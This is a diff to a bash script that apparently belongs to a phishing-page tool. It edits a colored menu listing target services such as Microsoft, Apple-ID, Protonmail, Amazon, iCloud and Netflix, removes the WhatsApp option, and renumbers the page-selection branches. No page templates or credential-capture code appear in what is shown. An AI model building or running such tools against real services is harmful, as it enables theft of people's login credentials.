@@ -48,8 +48,8 @@ printf "           \e[1;101m[\e[0m\e[1;77m07\e[0m\e[1;92m]\e[0m\e[1;0m Linkedin\
 printf "           \e[1;101m[\e[0m\e[1;77m08\e[0m\e[1;92m]\e[0m\e[1;0m Microsoft\e[0m     \e[1;101m[\e[0m\e[1;77m22\e[0m\e[1;92m]\e[0m\e[1;0m Badoo\e[0m              \e[1;101m[\e[0m\e[1;77m36\e[0m\e[1;92m]\e[0m\e[1;0m Youtube\e[0m\n"        
 printf "           \e[1;101m[\e[0m\e[1;77m09\e[0m\e[1;92m]\e[0m\e[1;0m Apple-ID\e[0m      \e[1;101m[\e[0m\e[1;77m23\e[0m\e[1;92m]\e[0m\e[1;0m Devian-Art\e[0m         \e[1;101m[\e[0m\e[1;77m37\e[0m\e[1;92m]\e[0m\e[1;0m LibertPay\e[0m\n"         
 printf "           \e[1;101m[\e[0m\e[1;77m10\e[0m\e[1;92m]\e[0m\e[1;0m Protonmail\e[0m    \e[1;101m[\e[0m\e[1;77m24\e[0m\e[1;92m]\e[0m\e[1;0m Shopping\e[0m           \e[1;101m[\e[0m\e[1;77m38\e[0m\e[1;92m]\e[0m\e[1;0m ip-Finder\e[0m\n"
-printf "           \e[1;101m[\e[0m\e[1;77m11\e[0m\e[1;92m]\e[0m\e[1;0m WiFi\e[0m          \e[1;101m[\e[0m\e[1;77m25\e[0m\e[1;92m]\e[0m\e[1;0m Amazon\e[0m             \e[1;101m[\e[0m\e[1;77m39\e[0m\e[1;92m]\e[0m\e[1;0m WhatsApp\e[0m\n"
-printf "           \e[1;101m[\e[0m\e[1;77m12\e[0m\e[1;92m]\e[0m\e[1;0m Wordpress\e[0m     \e[1;101m[\e[0m\e[1;77m26\e[0m\e[1;92m]\e[0m\e[1;0m iCloud\e[0m             \e[1;101m[\e[0m\e[1;77m40\e[0m\e[1;92m]\e[0m\e[1;0m Flipcart\e[0m\n"
+printf "           \e[1;101m[\e[0m\e[1;77m11\e[0m\e[1;92m]\e[0m\e[1;0m WiFi\e[0m          \e[1;101m[\e[0m\e[1;77m25\e[0m\e[1;92m]\e[0m\e[1;0m Amazon\e[0m             \e[1;101m[\e[0m\e[1;77m39\e[0m\e[1;92m]\e[0m\e[1;0m Flipcart\e[0m\n"
+printf "           \e[1;101m[\e[0m\e[1;77m12\e[0m\e[1;92m]\e[0m\e[1;0m Wordpress\e[0m     \e[1;101m[\e[0m\e[1;77m26\e[0m\e[1;92m]\e[0m\e[1;0m iCloud\e[0m\n"
 printf "           \e[1;101m[\e[0m\e[1;77m13\e[0m\e[1;92m]\e[0m\e[1;0m Badoo\e[0m         \e[1;101m[\e[0m\e[1;77m27\e[0m\e[1;92m]\e[0m\e[1;0m Spotify\e[0m\n"                                          
 printf "           \e[1;101m[\e[0m\e[1;77m14\e[0m\e[1;92m]\e[0m\e[1;0m Shopify\e[0m       \e[1;101m[\e[0m\e[1;77m28\e[0m\e[1;92m]\e[0m\e[1;0m Netflix\e[0m\e[1;94m\n"                      
 
@@ -206,14 +206,10 @@ server="ipfinder"
 start
 
 elif [[ $option == 39 ]]; then
-server="whatsapp"
-start
-
-elif [[ $option == 40 ]]; then
 server="flipcart"
 start
 
-elif [[ $option == 41 ]]; then
+elif [[ $option == 40 ]]; then
 server="create"
 createpage
 start
